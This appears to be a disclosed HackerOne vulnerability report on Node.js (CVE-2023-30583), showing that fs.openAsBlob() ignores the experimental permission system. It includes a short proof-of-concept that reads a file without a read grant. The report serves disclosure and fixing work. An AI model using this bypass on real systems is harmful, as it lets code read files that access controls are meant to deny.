# [M] fs.openAsBlob() bypasses permission system

## Summary
Severity: Medium (CVSS 4.4)
Program: Node.js
Weakness: Improper Access Control - Generic
Reporter: cjihrig
State: resolved
Disclosed: 2023-07-20T20:57:15.352Z
CVE: CVE-2023-30583
Source: https://hackerone.com/reports/1966492

## Details
**Summary:** [add summary of the vulnerability]
`fs.openAsBlob()` does not appear to be limited by the permission system.

**Description:** [add more details about this vulnerability]
Starting Node with `--experimental-permission` does not appear to restrict `fs.openAsBlob()`.

## Steps To Reproduce:

Run the following code with `--experimental-permission` and do not grant is read access to `file.txt`:

```js
'use strict';
const fs = require('node:fs');

async function main() {
	const blob = await fs.openAsBlob(__dirname + '/file.txt');

	console.log(await blob.text());
}

main();
```

## Impact: [add why this issue matters]

The permission system is bypassed when it should not be.

## Supporting Material/References:

None

## Impact

An attacker can read files they should not be able to.
